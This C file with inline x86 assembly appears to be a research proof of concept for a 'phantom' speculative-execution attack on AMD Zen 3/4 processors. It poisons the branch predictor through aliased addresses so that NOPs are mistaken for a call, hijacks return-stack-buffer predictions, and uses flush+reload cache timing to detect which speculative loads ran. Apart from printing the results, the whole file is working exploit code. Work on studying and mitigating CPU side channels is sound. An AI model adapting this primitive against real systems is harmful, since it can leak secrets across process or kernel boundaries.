#include <err.h>
#include <fcntl.h>
#include <inttypes.h>
#include <setjmp.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

sigjmp_buf mark;

#define RB_PTR         0x13370000
#define RB_STRIDE_BITS 12
#define RB_STRIDE      (0x1UL << RB_STRIDE_BITS)
#define RB_SLOTS       0x21
#define RSB_SIZE       32

#ifdef BOGUS
#define PTRN 0x111000000000UL
#else
#define PTRN 0x100100000000UL // Zen 3/4
#endif

#define PHANTOM_CALL        0x4000000003fUL
#define CALL_FN_TRAIN_ALIAS (PHANTOM_CALL ^ PTRN)
#define CALL_DEST_UNTRAIN   (PHANTOM_CALL ^ PTRN)

#define ROUNDS 10000

#define MMAP_FLAGS (MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_FIXED_NOREPLACE)
#define PROT_RW    (PROT_READ | PROT_WRITE)
#define PROT_RWX   (PROT_RW | PROT_EXEC)

__attribute__((aligned(4096))) static uint64_t results1[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results2[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results3[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results4[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results5[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results6[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results7[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results8[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results9[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results10[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results11[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results12[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results13[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results14[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results15[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results16[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results17[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results18[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results19[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results20[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results21[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results22[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results23[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results24[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results25[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results26[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results27[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results28[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results29[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results30[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results31[RB_SLOTS] = {0};
__attribute__((aligned(4096))) static uint64_t results32[RB_SLOTS] = {0};

#define NOPS_str(n)                                                                      \
    ".rept " xstr(n) "\n\t"                                                              \
                     "nop\n\t"                                                           \
                     ".endr\n\t"

#define str(s)  #s
#define xstr(s) str(s)

static inline __attribute__((always_inline)) uint64_t rdtsc(void) {
    uint64_t lo, hi;
    asm volatile("CPUID\n\t"
                 "RDTSC\n\t"
                 "movq %%rdx, %0\n\t"
                 "movq %%rax, %1\n\t"
                 : "=r"(hi), "=r"(lo)::"%rax", "%rbx", "%rcx", "%rdx");
    return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
    uint64_t lo, hi;
    asm volatile("RDTSCP\n\t"
                 "movq %%rdx, %0\n\t"
                 "movq %%rax, %1\n\t"
                 "CPUID\n\t"
                 : "=r"(hi), "=r"(lo)::"%rax", "%rbx", "%rcx", "%rdx");
    return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) void reload_range(long base, long stride,
                                                               int n, uint64_t *results) {
    asm("lfence");
    asm("mfence");
    int done = 0;
    for (volatile int k = 0; k < n / 2; k += 2) {
        uint64_t c = (n / 2) - 1 - ((k * 13 + 9) & ((n / 2) - 1));
        unsigned volatile char *p = (uint8_t *) base + (stride * c);
        uint64_t t0 = rdtsc();
        *(volatile unsigned char *) p;
        uint64_t dt = rdtscp() - t0;
        if (dt < 200)
            results[c]++;
        if (k == (n / 2) - 2 && !done) {
            k = -1;
            done = 1;
        }
    }
    asm("lfence");
    asm("mfence");

    done = 0;
    for (volatile int k = 0; k < n / 2; k += 2) {
        uint64_t c = (n / 2) + (n / 2) - 1 - ((k * 13 + 9) & ((n / 2) - 1));
        unsigned volatile char *p = (uint8_t *) base + (stride * c);
        uint64_t t0 = rdtsc();
        *(volatile unsigned char *) p;
        uint64_t dt = rdtscp() - t0;
        if (dt < 200)
            results[c]++;
        if (k == (n / 2) - 2 && !done) {
            k = -1;
            done = 1;
        }
    }
    asm("lfence");
    asm("mfence");

    if (n % 2 == 1) {
        unsigned volatile char *p = (uint8_t *) base + (stride * (n - 1));
        uint64_t t0 = rdtsc();
        *(volatile unsigned char *) p;
        uint64_t dt = rdtscp() - t0;
        if (dt < 200)
            results[n - 1]++;
    }
}

static inline __attribute__((always_inline)) void flush_range(long start, long stride,
                                                              int n) {
    asm("lfence");
    asm("mfence");
    for (uint64_t k = 0; k < n; ++k) {
        volatile void *p = (uint8_t *) start + k * stride;
        __asm__ volatile("clflushopt (%0)\n" ::"r"(p));
        __asm__ volatile("clflushopt (%0)\n" ::"r"(p));
    }
    asm("lfence");
    asm("mfence");
}

void phantom_jmp();
void phantom_jmp_end();
asm(".align 0x1000\n\t"
    "phantom_jmp:\n\t"
    "call *%r8\n\t"
    "phantom_jmp_end:\n\t");

void leak();
void leak_end();
asm(".align 0x1000\n\t"
    "leak:\n\t" NOPS_str(3) // These NOPs are confused for a CALL and push to RSB!
    "mov " xstr((RB_PTR +
                 (RSB_SIZE * RB_STRIDE))) ", %r8\n\t"
                                          "lfence\n\t"
                                          "mfence\n\t" NOPS_str(1000) "jmp *%r10\n\t"
                                                                      "leak_end:\n\t");

void phantom_call();
void phantom_call_end();
asm(".align 0x1000\n\t"
    "phantom_call:\n\t"
    "call *%r8\n\t"
    "phantom_call_end:\n\t");

void phantom_jump_insert();

void clean_exit_on_sig(int sig_num) {
    siglongjmp(mark, 1);
}

int main(int argc, char *argv[]) {
    signal(SIGSEGV, clean_exit_on_sig);

    // We first allocate the reload buffer
    if (mmap((void *) RB_PTR, ((RB_SLOTS + 1) << RB_STRIDE_BITS), PROT_RW, MMAP_FLAGS, -1,
             0) == MAP_FAILED) {
        err(1, "rb");
    }

    uint64_t jmp_fn_train_alias = (uint64_t) phantom_jump_insert ^ PTRN;

    if (mmap((void *) (jmp_fn_train_alias & ~0xfff), 0x8000, PROT_RWX, MMAP_FLAGS, -1,
             0) == MAP_FAILED) {
        err(1, "jmp_fn_train");
    }

    memcpy((void *) jmp_fn_train_alias, phantom_jmp, phantom_jmp_end - phantom_jmp);

    if (mmap((void *) (CALL_DEST_UNTRAIN & ~0xfff), 0x8000, PROT_RWX, MMAP_FLAGS, -1,
             0) == MAP_FAILED) {
        err(1, "CALL_DEST_UNTRAIN");
    }

    memcpy((void *) CALL_DEST_UNTRAIN, phantom_call, phantom_call_end - phantom_call);

    uint64_t *results_arr[32] = {
        results1,  results2,  results3,  results4,  results5,  results6,  results7,
        results8,  results9,  results10, results11, results12, results13, results14,
        results15, results16, results17, results18, results19, results20, results21,
        results22, results23, results24, results25, results26, results27, results28,
        results29, results30, results31, results32};

    for (int k = 0; k < 32; k++) {
        uint64_t *res = results_arr[k];
        for (int i = 0; i < 33; i++) {
            res[i] = 0;
        }
    }

    for (int i = 0; i < ROUNDS; i++) {
        if (sigsetjmp(mark, 1) == 0) {
            // clang-format off
            asm("mov $" xstr(PHANTOM_CALL) ", %%r8\n\t"
                "jmp *%[phantom_train]\n\t"
                "1:\n\t" ::[phantom_train] "r"(jmp_fn_train_alias) : "r8");
            // clang-format on
        }

        if (sigsetjmp(mark, 1) == 0) {
            // clang-format off
            asm("mov $1f, %%r10\n\t"
                "mov $" xstr(PHANTOM_CALL) ", %%r8\n\t"
                "mov $" xstr(CALL_DEST_UNTRAIN) ", %%r9\n\t"
                "jmp *%%r9\n\t"
                "1:\n\t"
                "pop %%r9\n\t" ::: "r8", "r9", "r10");
            // clang-format on
        }

        if (mmap((void *) (PHANTOM_CALL & ~0xfff), 0x8000, PROT_RWX, MMAP_FLAGS, -1, 0) ==
            MAP_FAILED) {
        }
        memcpy((void *) PHANTOM_CALL, leak, leak_end - leak);

        // clang-format off
        asm(".secret=0\n\t"
            ".rept " xstr(RSB_SIZE) "\n\t"
            "call 4f\n\t"
            "mov $.secret, %%rdi\n\t"
            "shl $" xstr(RB_STRIDE_BITS) ", %%rdi\n\t"
            "mov " xstr(RB_PTR) "(%%rdi), %%r8\n\t"
            "nop\n\t"
            "4: pop %%r9\n\t"
            ".secret=.secret+1\n\t"
            ".endr\n\t" ::: "r9");

        asm(
            NOPS_str(512)
            "jmp a\n\t" NOPS_str(64)
            "a:\n\t"
            "jmp b\n\t"
            NOPS_str(512)
            "b:\n\t"
            NOPS_str(512)
            "jmp c\n\t"
            NOPS_str(512)
            "c:\n\t"
            NOPS_str(512)
            "jmp d\n\t"
            NOPS_str(512)
            "d:\n\t"
            "jmp phantom_jump_insert\n\t"
            NOPS_str(512)
            ".align 0x1000\n\t"
            NOPS_str(0x3f)
            "phantom_jump_insert:\n\t");
        // clang-format on

        // Execute RSB_SIZE returns
        for (int k = 0; k < RSB_SIZE; k++) {
            flush_range(RB_PTR, 1 << RB_STRIDE_BITS, RB_SLOTS);
            asm("mfence\n\t"
                "pushq $1f\n\t"
                "mfence\n\t"
                "clflush (%%rsp)\n\t"
                "mfence\n\t"
                "ret\n\t"
                "1:\n\t" ::
                    :);
            uint64_t *res = results_arr[k];
            reload_range(RB_PTR, 1 << RB_STRIDE_BITS, RB_SLOTS, res);
        }

        munmap((void *) (PHANTOM_CALL & ~0xfff), 0x8000);
    }

    // Print results
    printf("     Return: ");
    for (int i = 0; i < RSB_SIZE; i++) {
        printf(" - %05d", i + 1);
    }
    printf("\n");

    for (int i = 0; i < RSB_SIZE; ++i) {
        printf("RB entry %02d: ", i);
        for (int k = 0; k < RSB_SIZE; k++) {
            uint64_t *res = results_arr[k];
            printf(" - %05ld", res[i]);
        }
        printf("\n");
    }

    printf("   Hijacked: ");
    for (int i = 0; i < RSB_SIZE; i++) {
        uint64_t *res = results_arr[i];
        printf(" - %05ld", res[RSB_SIZE]);
    }

    printf("\n");

    return 0;
}
